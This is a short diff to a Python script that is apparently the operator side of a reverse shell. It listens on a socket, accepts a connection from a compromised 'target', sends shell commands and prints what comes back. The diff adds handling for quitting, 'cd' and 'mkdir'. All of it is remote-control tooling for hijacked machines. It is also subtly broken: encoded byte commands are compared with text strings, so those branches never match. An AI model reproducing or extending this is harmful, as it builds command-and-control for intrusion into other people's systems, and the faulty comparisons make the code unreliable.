@@ -9,7 +9,12 @@ def shell_command():
         command = command.encode()
         target.send(command)
         if command == 'q':
+            target.close()
             break
+        elif command[:2] == 'cd' and len(command) > 1:
+            continue
+        elif command[:5] == 'mkdir' and len(command) > 1:
+            continue
         else:
             result = target.recv(2048)
             result = result.decode()
@@ -23,9 +28,9 @@ def listener():
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
     sock.bind((listener_ip, listener_port))
     sock.listen()
-    print("[+] Listening for target ... \n")
+    print("[+] Listening for target ...\n")
     target, ip = sock.accept()
-    print("[+] Get connection from target. Starting shell command...")
+    print("[+] Get connection from target. Starting shell command...\n")
 
 if __name__ == "__main__":
     listener()
